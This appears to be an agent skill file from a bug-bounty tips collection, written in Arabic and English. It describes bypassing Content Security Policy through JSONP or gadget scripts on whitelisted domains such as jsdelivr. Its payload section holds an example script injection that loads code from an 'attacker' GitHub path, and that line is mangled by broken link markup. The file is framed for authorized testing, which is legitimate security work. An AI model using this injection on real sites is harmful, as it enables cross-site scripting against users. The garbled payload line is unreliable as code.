# SKILL: CSP Bypass عبر JSONP/Scripts على Domains موثوقة

**Skill id:** `tip/csp-bypass-عبر-jsonpscripts-على-domains-موثوقة`  
**Category:** XSS  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e88081939c40eec9718c7d0e  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **XSS**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو الـ CSP بيسمح بـ domain موثوق (زي Google، GitHub، أو CDN معين)، دور على endpoint فيه JSONP أو script قديم فيه gadget على نفس الـ domain — بيسمحلك تنفذ JS من داخل الـ whitelist بدون ما الـ CSP يمنع.

## Payload / Code

```
CSP مثال: script-src 'self' [https://cdn.jsdelivr.net](https://cdn.jsdelivr.net)

Exploit:
\\](https://cdn.jsdelivr.net/gh/attacker/xss-payload@main/payload.js%22%3E%3C/script%3E)

أو دور على JSONP endpoint على نفس الـ domain المسموح
```

## Source

Intigriti Official 2026 (Tip 15) + Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
